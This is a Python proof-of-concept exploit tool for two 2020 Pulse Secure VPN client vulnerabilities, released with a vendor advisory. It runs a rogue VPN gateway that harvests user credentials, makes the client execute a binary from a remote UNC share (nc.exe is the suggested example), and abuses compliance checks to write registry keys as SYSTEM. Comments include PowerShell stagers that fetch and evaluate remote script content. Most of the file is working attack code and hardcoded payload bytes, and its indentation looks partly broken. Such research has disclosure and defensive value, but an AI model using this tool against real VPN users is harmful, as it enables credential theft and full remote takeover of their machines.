# -*- coding: utf-8 -*-

"""
# pulse-secure-vpn-mitm-research
Pulse Secure VPN mitm Research

## Release date
Joint release date with vendor: 26 Oct 2020

## Author
David Kierznowski, @withdk

## CVE Refs
The following issues were identified as part of this research.
* CVE-2020-8241
* CVE-2020-8239

## Summary
This is a proof-of-concept tool developed to explore and test man-in-the-middle attacks targeting Pulse Secure Clients
running on Microsoft Windows 10.

The tool works by masquerading as a Pulse Secure gateway. Once a client connects the following attacks are implemented
(PoC only):
* Steal user credentials. A rogue server could lure the user into revealing their login credentials.
* Execute binary from a Microsoft Windows UNC path. The PCS server supports the option to launch an executable following
  authentication. This can be abused to get code execution with the permissions of the logged on user. This builds on the
  work of Alyssa Herrera and team Alyssa Herrera (4 September 2019).
* Full remote administrator access by abusing host compliance checks. The host compliance checks are executed as SYSTEM.
  A rogue server could abuse this functionality to push down a malicious policy which allows arbitrary write access to the
  registry.
* Intercept network traffic. This will allow the attacker to intercept and modify network traffic even when "always-on" is
  enabled. Currently the tool only displays network traffic requests from the endpoint.

## Recommendations
In mitigating and remediating the issue the following recommendations should be considered:
* Organisations should conduct compliance against the Pulse Secure security best practises (Pulse Secure, 2 July 2019). Ensure
  that “Dynamic certificate trust” is disabled.
* Apply the vendor fixes (see https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601).
* PCS Server script execution is executed as a child process of “Pulse.exe”. Thus, safeguards can be deployed by monitoring
  child processes of the “Pulse.exe” binary.
* Monitor the “PulseSecureService” service for suspicious registry activity.

## Refs
The original writeup with more info can be found here:
 * @withdk, Pulse Secure mitm Research [Online]. Available at https://github.com/withdk/pulse-secure-mitm-research/
 * See code commends in the main function. It provides a lot more details about the inner workings.

## Disclaimer
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF 
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE 
FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION 
WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""

import argparse
import socket
import ssl
import re
#import getopt
import sys
import struct

def getlen(aByteString):
  aLen=bytearray(struct.pack(">H", len(aByteString)))
  return(aLen)

def updatelen(aByteString):
  aLen = getlen(aByteString)
  aByteString[10:12] = aLen
  return(aByteString)

def updatecmd(aByteString):
  aByteString = aByteString + b'\x00'
  aLen = getlen(aByteString)
  aByteString = aLen + aByteString
  return(aByteString)

def which(conn):
  print(conn.recv()[0:3])

def handle(conn):
  '''
  TODO: Messy function with hardcoded byte strings captured from a lab session.
  '''
  while True:
    raw = conn.recv()
    if(raw[0:3]==b'GET'):
        print("******************************")
        print("******************************")
        print("******************************")
        print("Got EAP. Switching to EAP protocol.")
        print(raw)
        conn.write(b'HTTP/1.1 101 Switching Protocols\nContent-type: application/octet-stream\nPragma: no-cache\nUpgrade: IF-T/TLS 1.0\nConnection: Upgrade\nConnection: Keep-Alive\nKeep-Alive: timeout=15\nStrict-Transport-Security: max-age=31536000\n\n')
    else:
        #if(raw[0:4]==b"\x00\x00\x0A\x4c.*"):
        if(raw[16:20]==b"\x63\x6c\x69\x65"):
            print("******************************")
            print("******************************")
            print("******************************")
            print("Got a hostname and IP address")
            print(raw)
            print("Sending expected requests")
            conn.write(b'\x00\x00\x55\x97\x00\x00\x00\x02\x00\x00\x00\x14\x00\x00\x01\xF5\x00\x00\x00\x02')
            conn.write(b'\x00\x00\x55\x97\x00\x00\x00\x05\x00\x00\x00\x14\x00\x00\x01\xF6\x00\x0A\x4C\x01')
        if(raw[25:29]==b'anon'):
            print("******************************")
            print("******************************")
            print("******************************")
            print("Got anonymous username string")
            print(raw)
            print("Sending server string (hardcoded)")
            conn.write(b'\x00\x00\x55\x97\x00\x00\x00\x05\x00\x00\x00\x60\x00\x00\x01\xF7\x00\x0A\x4C\x01\x01\x02\x00\x4C\xFE\x00\x0A\x4C\x00\x00\x00\x01\x00\x00\x0D\x49\x80\x00\x00\x10\x00\x00\x05\x83\x00\x00\x00\x04\x00\x00\x0D\x4A\x80\x00\x00\x10\x00\x00\x05\x83\x00\x00\x00\x01\x00\x00\x0D\x56\x80\x00\x00\x1D\x00\x00\x05\x83\x56\x41\x53\x50\x48\x31\x45\x34\x36\x31\x36\x45\x4B\x50\x42\x41\x53\x00\x00\x00')
        if(raw[96:101]==b'Pulse'):
            print("******************************")
            print("******************************")
            print("******************************")
            print("Got pulse client version")
            print(raw)
            print("Sending request to login")
            # Standard login (patched)
            if(CMDHACK):
                conn.write(b'\x00\x00\x55\x97\x00\x00\x00\x05\x00\x00\x00\x38\x00\x00\x01\xF8\x00\x0A\x4C\x01\x01\x03\x00\x24\xFE\x00\x0A\x4C\x00\x00\x00\x01\x00\x00\x00\x4F\x40\x00\x00\x15\x01\x00\x00\x0D\xFE\x00\x0A\x4C\x00\x00\x00\x02\x01\x00\x00\x10')
            else:
                ''' Use REGHACK instead of CMDHACK and AutoLogin '''
                conn.write(b'\x00\x00\x55\x97\x00\x00\x00\x05\x00\x00\x00\x38\x00\x00\x01\xF8\x00\x0A\x4C\x01\x01\x03\x00\x24\xFE\x00\x0A\x4C\x00\x00\x00\x01\x00\x00\x00\x4F\x40\x00\x00\x15\x01\x01\x00\x0D\xFE\x00\x0A\x4C\x00\x00\x00\x03\x21\x00\x00\x10')
            raw = '';
            while len(raw) < 1:
                raw = conn.recv()
                if(raw[0:4]==b'\x00\x00\x55\x97'):
                      print("******************************")
                      print("******************************")
                      print("******************************")
                      print("USERNAME & PASSWORD!!!!!! :)")
                      print(raw)
                      print("Sending fake session info")
                      conn.write(b'\x00\x00\x55\x97\x00\x00\x00\x05\x00\x00\x00\xD0\x00\x00\x01\xF9\x00\x0A\x4C\x01\x01\x04\x00\xBC\xFE\x00\x0A\x4C\x00\x00\x00\x01\x00\x00\x0D\x53\x80\x00\x00\x2C\x00\x00\x05\x83\x62\x39\x63\x61\x66\x30\x31\x63\x62\x34\x61\x38\x30\x39\x33\x65\x34\x62\x66\x31\x37\x36\x35\x30\x30\x65\x31\x66\x35\x32\x34\x37\x00\x00\x0D\x5C\x80\x00\x00\x10\x00\x00\x05\x83\x00\x00\x0E\x10\x00\x00\x0D\x54\x80\x00\x00\x18\x00\x00\x05\x83\x31\x37\x32\x2E\x31\x36\x2E\x31\x30\x2E\x31\x30\x00\x00\x0D\x55\x80\x00\x00\x2C\x00\x00\x05\x83\x61\x64\x63\x37\x36\x66\x32\x33\x39\x37\x38\x38\x61\x39\x36\x34\x66\x30\x38\x66\x34\x63\x64\x37\x39\x35\x35\x66\x33\x34\x65\x35\x00\x00\x0D\x6B\x80\x00\x00\x10\x00\x00\x05\x83\x00\x00\x00\x10\x00\x00\x0D\x75\x80\x00\x00\x10\x00\x00\x05\x83\x00\x00\x00\x00\x00\x00\x0D\x57\x80\x00\x00\x10\x00\x00\x05\x83\x00\x00\x00\x00')
	if(raw==b'\x00\x00\x55\x97\x00\x00\x00\x06\x00\x00\x00\x20\x00\x00\x00\x00\x00\x0A\x4C\x01\x02\x04\x00\x0C\xFE\x00\x0A\x4C\x00\x00\x00\x01'):
		print("******************************")
            	print("******************************")
            	print("******************************")
		print("Sending after auth request 1")
		conn.write(b'\x00\x00\x55\x97\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x01\xFA\x00\x0A\x4C\x01\x03\x04\x00\x04')
		print("Sending after auth request 2: seems like network info")
		#conn.write(b'\x00\x00\x0A\x4C\x00\x00\x00\x01\x00\x00\x01\x18\x00\x00\x01\xFB\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2C\x20\xF0\x00\x00\x00\x00\x00\x00\x00\x01\x08\x2E\x00\x00\x18\x01\x00\x00\x00\x07\x00\x00\x10\x00\x00\xFF\xFF\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\xD4\x03\x00\x00\x00\x40\x00\x00\x01\x00\x40\x01\x00\x01\x00\x40\x1F\x00\x01\x00\x40\x20\x00\x01\x00\x40\x21\x00\x01\x00\x40\x05\x00\x04\x00\x00\x05\x78\x00\x03\x00\x04\xC0\xA8\x01\xFE\x40\x06\x00\x0A\x6C\x61\x62\x2E\x6C\x6F\x63\x61\x6C\x00\x40\x07\x00\x04\x00\x00\x00\x01\x40\x19\x00\x01\x00\x40\x1A\x00\x01\x00\x40\x0F\x00\x02\x00\x00\x40\x10\x00\x02\x00\x00\x40\x11\x00\x02\x00\x00\x40\x12\x00\x04\x00\x00\x00\x00\x40\x13\x00\x04\x00\x00\x00\x00\x40\x14\x00\x04\x00\x00\x00\x00\x40\x15\x00\x04\x00\x00\x00\x00\x40\x16\x00\x02\x00\x00\x40\x17\x00\x04\x00\x00\x00\x00\x40\x18\x00\x04\x00\x00\x00\x00\x00\x01\x00\x04\x0A\x01\x01\x0A\x00\x02\x00\x04\xFF\xFF\xFF\xFF\x40\x0B\x00\x04\x0A\xC8\xC8\xC8\x40\x0C\x00\x01\x00\x40\x0D\x00\x01\x00\x40\x0E\x00\x01\x00\x40\x1B\x00\x01\x00\x40\x1C\x00\x01\x00\x00\x13\x00\x01\x00\x00\x14\x00\x01\x00')
		# Run calc.exe
		cmdbytes=updatecmd(bytearray(CMD))
		sendByteString = bytearray('\x00\x00\x0A\x4C\x00\x00\x00\x01\x00\x00\x01\x34\x00\x00\x01\xFB\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2C\x20\xF0\x00\x00\x00\x00\x00\x00\x00\x01\x24\x2E\x00\x00\x18\x01\x00\x00\x00\x07\x00\x00\x10\x00\x00\xFF\xFF\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\xF0\x03\x00\x00\x00\x40\x00\x00\x01\x00\x40\x01\x00\x01\x00\x40\x1F\x00\x01\x00\x40\x20\x00\x01\x00\x40\x21\x00\x01\x00\x40\x05\x00\x04\x00\x00\x05\x78\x00\x03\x00\x04\xC0\xA8\x01\xFE\x40\x06\x00\x0A\x6C\x61\x62\x2E\x6C\x6F\x63\x61\x6C\x00\x40\x07\x00\x04\x00\x00\x00\x01\x40\x19\x00\x01\x00\x40\x1A\x00\x01\x00\x40\x0F\x00\x02\x00\x00\x40\x10\x00\x02\x00\x00\x40\x11\x00\x02\x00\x00\x40\x12\x00\x04\x00\x00\x00\x00\x40\x13\x00\x04\x00\x00\x00\x00\x40\x14\x00\x04\x00\x00\x00\x00\x40\x15\x00\x04\x00\x00\x00\x00\x40\x16\x00\x02\x00\x00\x40\x17\x00\x04\x00\x00\x00\x00\x40\x18\x00\x04\x00\x00\x00\x00\x00\x01\x00\x04\x0A\x01\x01\x0A\x00\x02\x00\x04\xFF\xFF\xFF\xFF\x40\x0B\x00\x04\x0A\xC8\xC8\xC8\x40\x0C' + cmdbytes + '\x40\x0D\x00\x01\x00\x40\x0E\x00\x01\x00\x40\x1B\x00\x01\x00\x40\x1C\x00\x01\x00\x00\x13\x00\x01\x00\x00\x14\x00\x01\x00')
		sendByteString = updatelen(sendByteString)
		conn.write(sendByteString)
		print("Sending after auth request 3")
		conn.write(b'\x00\x00\x0A\x4C\x00\x00\x00\x8F\x00\x00\x00\x14\x00\x00\x01\xFC\x00\x00\x00\x00')
	if(raw[7:11]==b'\x06\x00\x00\x08') and REGHACK:
	    	print("******************************")
            	print("******************************")
            	print("******************************")
		print("Got a compliance response")
		print(raw)
		print("Sending compliance response")
		conn.write(b'\x00\x00\x55\x97\x00\x00\x00\x05\x00\x00\x02\x28\x00\x00\x01\xF9\x00\x0A\x4C\x01\x01\x04\x02\x14\xFE\x00\x0A\x4C\x00\x00\x00\x01\x00\x00\x00\x4F\x40\x00\x02\x05\x01\x02\x01\xFD\xFE\x00\x0A\x4C\x00\x00\x00\x03\x01\x00\x00\x00\x16\xC0\x00\x01\xEF\x00\x00\x05\x83\x00\x00\x02\xE8\x78\x9C\x8D\x52\xCD\x6A\x1B\x31\x10\x56\x03\xB9\x14\x1F\x7A\xEA\x59\xEC\x03\x14\xCB\x5E\xFF\xB1\x55\x61\x71\x1D\x62\xE2\x9F\x34\x49\x1D\x52\x0C\x8B\x2C\x8D\x5D\xD5\x5E\x69\x91\xB4\x8E\x0D\x3E\x14\xF2\x62\x79\x8C\x3E\x40\xA1\x0F\xD0\x17\xA8\x64\xA7\xC1\xD0\x1E\xA2\x8B\x46\xDF\x8C\xE6\x9B\xF9\x66\x10\xAA\xFC\x7C\x44\x27\x3F\x10\x3A\x7D\x40\xA8\xF2\xEB\x11\xA1\x72\x6F\x9F\x3E\xBC\x7D\x7F\x99\x5E\xA5\x43\x3C\x4A\x87\x3D\x1A\x5D\x32\xC3\x72\x70\x60\xAA\x11\x9E\xA4\x83\xCF\x1E\x4A\x38\x18\x97\xE5\xA2\x41\x99\xE0\xAD\xE6\xBC\x56\xEF\xB4\xDA\x6D\xD6\x69\xC6\xF3\x6A\x7B\x1E\x73\xD1\xEA\x34\x1A\xF3\x7A\x0C\x8D\xC4\x82\x59\x83\xC9\x9C\xCC\x81\x92\x46\xBB\x4D\xEA\x31\x89\xEB\xD1\x87\xD7\x68\x7F\x02\xEF\xC9\xD5\x33\x6F\x11\xB8\xB0\xF2\x7C\x34\x2A\xFE\xF2\x92\x08\xAF\xD9\xAA\xF4\x90\x9E\x7D\x03\xEE\x32\x55\xE6\x33\x30\x94\x24\xB8\x30\x7A\x2D\x85\xB7\x0D\x2C\xA4\x75\x66\x9B\x60\x53\xAE\x40\x0A\x42\xAB\x07\x33\xE4\x22\xC1\xFD\x95\xF1\xA5\x87\x9E\xE2\xB2\x25\x6C\x09\x3D\xBF\xE8\xDD\x65\x83\x71\x37\x1D\x64\xC3\xB4\x7B\xDE\x1F\xF5\x8E\x22\x6C\x39\xDB\x07\x5D\x8F\xCF\x6E\x6E\xD3\xAB\xDE\x74\x28\xB9\xD1\x56\xCF\xDD\xF4\x56\x2A\xA1\xEF\x2D\x1E\xDD\x4C\xBB\xA5\x31\xA0\xDC\x04\x8C\x95\x5A\x4D\xFB\x39\x5B\x00\x3E\x93\x2B\xC0\xBD\x0D\xF0\xD2\x79\x10\x8F\x8B\x70\xD9\xA9\xD2\x0E\x0A\x26\xDE\xC1\x06\x8E\x78\x0E\x15\x0A\x98\x95\x8B\x05\x98\x23\x87\xDB\x16\xDE\x71\xED\x8C\x54\x8B\x3D\x3C\x91\x70\xDF\x8C\x49\x68\x3C\x97\xCA\xCB\xFA\xDC\xA5\x81\x1C\x04\xB5\xE0\x12\xAC\x00\x84\x1D\x6A\x25\x9D\x0E\x1F\x43\xB0\xD7\x49\xAF\x24\xDF\xD2\x35\xAF\xEE\x6A\xBB\xC3\x23\xAB\xED\xC8\xEE\x5F\x5D\xF6\x4A\x13\x7A\x57\x23\xCB\x41\x3E\x89\xBF\x7C\xA2\x34\xC1\x33\x66\xA1\x19\x83\xE2\x5A\x80\x97\x96\xF8\xF1\xFD\x7F\x54\xB5\x17\x8C\xEA\x40\x2F\x98\x63\x2F\xA9\xCB\x37\xC7\x75\xA9\x5C\x48\x01\x9B\xC2\x80\x0D\x3A\xF7\x3F\x5A\x5F\x16\xD7\x4A\xC8\x20\x2D\x5B\x79\x21\x22\xFC\xB4\x54\x95\xDF\xDF\x11\x7A\x73\xD8\x6B\xF4\xEA\x0F\xDC\xD1\xF8\x88\x00\x00\x00\x00')
		print("Sending registry hack: Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe debugger=cmd.exe")
		conn.write(b'\x00\x00\x55\x97\x00\x00\x00\x05\x00\x00\x01\x6C\x00\x00\x01\xFA\x00\x0A\x4C\x01\x01\x05\x01\x58\xFE\x00\x0A\x4C\x00\x00\x00\x01\x00\x00\x00\x4F\x40\x00\x01\x49\x01\x03\x01\x41\xFE\x00\x0A\x4C\x00\x00\x00\x03\x01\x00\x00\x00\x16\xC0\x00\x01\x34\x00\x00\x05\x83\x00\x00\x01\x6C\x78\x9C\x4D\x50\x4D\x6B\xC2\x40\x14\x5C\x0F\x5E\x24\x42\xE9\xA1\xE7\x25\xA7\x96\x96\xD8\xDA\x9B\x55\x69\x31\x1E\x02\x5A\xC5\x08\x52\x10\xCA\x76\xF3\x1A\xB7\xC6\xC4\x66\x9F\x62\x20\x87\x82\xBF\xA6\xFF\xC2\x1F\x53\xDA\x6B\x3F\xFE\x40\xDF\x56\x0B\x0E\x0B\x3B\x33\x3C\x66\xDF\x2C\x63\xD6\xDB\x86\x31\x8B\xB1\xE2\x9A\xAE\xCF\x0D\x2B\x5C\xEF\xF8\x17\xF9\x07\x86\x23\x68\x24\xFD\x4D\xFA\xD5\xE8\xE1\x44\x69\x4E\xE7\x41\x04\x7C\x26\x10\x1C\x42\xB9\x54\xD7\x32\x55\x73\xE4\x91\x88\xC3\x85\x08\xA1\x61\x3F\x89\xA5\xD8\x9A\x36\xC7\x6C\x4E\x0E\xC2\x0A\x2B\x7B\x76\xB3\x5C\xF2\x33\x8D\x30\x73\x5C\x25\xC2\x38\xD1\xA8\xA4\x76\xFA\x69\x22\x41\x6B\xC7\x47\x91\xE2\xB1\xDD\xAA\x8D\x47\xDE\xAD\xDB\x1B\xF9\x63\xFD\x37\x7C\x59\x1D\x4B\x11\x49\x07\x56\x60\x9F\x5C\x95\x4B\x9C\x50\xAF\x6C\x23\x9B\xCC\xC0\x7A\xA7\x5D\x4F\xCD\xAE\x03\x78\x5E\xA8\x14\x02\x9E\x42\xA8\x34\xA6\x19\x9F\x42\xC6\xE3\x04\xF9\x63\xB2\x88\x03\x33\x6B\xFA\x77\x76\x9D\x3F\x88\x6F\xFB\x17\xD7\x47\x83\x76\xB7\xED\x7A\x37\xC3\x76\xAD\xDF\xEB\x78\xAD\x3B\xCF\x6D\x2C\xE5\x79\x5E\xCD\xE7\x49\xA4\x64\x76\x5F\xCD\x2F\x72\x8A\x9D\x08\x39\x3D\xD3\x80\xE6\xE1\xC3\xFF\x3F\x23\x5E\xA0\xBC\x9F\x97\x3D\xFD\x0B\x6C\x53\x68\x94\x04\x8C\x95')

        print(raw)
    if(len(raw) == 0):
        return(False);

  """conn.write(b'HTTP/1.1 200 OK\n\n%s' % conn.getpeername()[0].encode())"""

def main():
    global REGHACK, CMDHACK, CMD

    parser=argparse.ArgumentParser(description='CVE-2020-8239, CVE-2020-8241 Pulse Secure VPN MitM PoC tool')
    parser.add_argument('-v', '--verbose', '--debug', action='store_true')
    parser.add_argument('-i','--ip', required=True, help='x.x.x.x ; interface to listen on')
    parser.add_argument('-p','--port', required=False, help='443 ; defaults to port 443')
    parser.add_argument('--cmdhack', required=False, help='\\\\\\\\172.16.10.146\\\\test\\\\nc.exe ; Execute binary via UNC path as logged in user')
    parser.add_argument('--reghack', required=False, help='True|False ; Execute PowerShell script as SYSTEM (CVE-2020-8241)')
    #parser.add_argument('-c','--cmd', required=True, help='ls /')
    #parser.add_argument('-i','--interactive', required=False, help='shell')
    #parser.add_argument('-p','--proxy', help='e.g. 127.0.0.1:8080')
    #parser.add_argument('-ua','--useragent')
    args=parser.parse_args()

    if args.verbose:
        debug=True

    # SSL Setup
    # $ openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem
    CERT = 'cert.pem'
    KEY = 'key.pem'
    HOST=args.ip
    if args.port:
        PORT=int(args.port)
    else:
        PORT = 443
    if args.cmdhack:
        '''
        Please refer to Alyssa Herrera’s (Alyssa Herrera, 2019) detailed write up on this attack. Although the initial
        compromise vector is different, i.e. we don't need to compromise the server, the attack is the same.

        Pulse copies the binary to %userdata%\\tmp and then executes it. There is no obvious way to pass arguments. We use UNC instead.
        Quick way to setup smbserver on Kali:
            1. cp /usr/share/windows-binaries/nc.exe /tmp
            2. cd /usr/share/doc/python-impacket/examples
            3. ./smbserver.py TEST /tmp -smb2support
            4. python rogue-pulse-svr.py -i 172.16.10.220 --cmdhack \\\\172.16.10.220\\test\\nc.exe
        '''
        print("The default attack option is selected.")
        print("It will send the user a request to login and capture credentials before executing cmd.")
        print("Payload at: %s" % args.cmdhack)
        print("")
        CMDHACK=True
        CMD=args.cmdhack
    else:
        CMDHACK=False
    if args.reghack:
        '''
        Reghack exploits CVE-2020-8241. This allows us to create an arbitrary registry key as SYSTEM.

        One method of acquiring code execution is by abusing Windows debugging options and installing a malicious “debugger”
        when a particular executable is run. For the PoC we just poison "notepad.exe" with cmd.exe.

        The affected registry key is:
        Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe

        When attempting to exploit this in the lab we ran into several challenges that we had to overcome.

        Due to length restrictions with the debugger string, two registry keys are required, called “stage0” and “stage1”.
        The first stager simply calls the second stager which has a much larger buffer to play with.

        Stager 0 (queries reg key t):
        powershell -command iex(Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe'
        -name t) #

        As the attack is hardcoded, “stager1” needs a way of dynamically calling home. For this, the stager acquires the
        hostname from the Pulse Secure Client configuration file, performs a UNC request for “1.txt” and then evaluates it.

        Stager 1 (generic payload to call back to rogue server):
        $u=Select-String -pattern 'uri: "(.*)"' "C:\ProgramData\Pulse Secure\ConnectionStore\connstore.bak" | % {$_.matches} | % {$_.groups[1]} | % {$_.value}
        if($u)
        {
            $u='\\'+$u+'\t\'+'1.txt' ### $u = ‘\\{svr_in_config}\t\1.txt’ ###
            iex(gc $u)
        }

        Note, the PoC was not weaponised. Instead, it simply sets up cmd.exe as a debugger for notepad.exe. After executing, we can run
        notepad.exe to test if the target is vulnerable, or check if the debugger key exists in the above registry path.
        '''
        print("reghack (CVE-2020-8241) is selected (see code comments).")
        print("It will perform an autologin and not request the user to authenticate.")
        print("")
        REGHACK=True
        CMDHACK=False
        CMD="blah" # TODO
    else:
        REGHACK=False

    if CMDHACK == False and REGHACK == False:
        exit("No attack selected. Please use --cmdhack or --reghack options. Use -h for help.")

    sock = socket.socket()
    sock.bind((HOST, PORT))
    sock.listen(5)
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=CERT, keyfile=KEY)
    print("Listening for clients....")

    while True:
        conn = None
        ssock, addr = sock.accept()
        try:
            conn = context.wrap_socket(ssock, server_side=True)
            handle(conn)
        except ssl.SSLError as e:
            print(e)
        finally:
            if conn:
                conn.close()

if __name__ == '__main__':
  main()
